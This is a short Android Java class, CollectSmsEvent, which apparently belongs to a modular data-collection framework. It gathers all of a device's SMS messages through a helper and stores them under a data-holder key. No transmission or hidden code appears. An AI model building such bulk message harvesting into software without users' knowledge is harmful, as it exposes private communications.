package com.xaviar.collect.sms_event;


import android.content.Context;
import android.util.Log;

import com.xaviar.frm.DataHolder;
import com.xaviar.frm.ICollector;
import com.xaviar.frm.ThreadCollector;

public class CollectSmsEvent extends ThreadCollector implements ICollector {

	private  static String name = "CollectSmsEvent";
	private static final String TAG = name;
	
	

	public CollectSmsEvent(String genericData) {
		this.genericData = genericData;
	}
	
	public CollectSmsEvent() {
		setName(CollectSmsEvent.name);
	}


	public CollectSmsEvent(Context ctx) {
		setContext(ctx);
	}

	@Override
	protected String getAllData() {
		Log.d(TAG,"Enter sms getAllData()");
		genericData = SmsEventUtil.getAllSmsGeneric(ctx);			
		return genericData;
	}
	

	
	@Override
	public String getHolderKey() {
	  return DataHolder.SMS_EVENT;		
	}
	

}

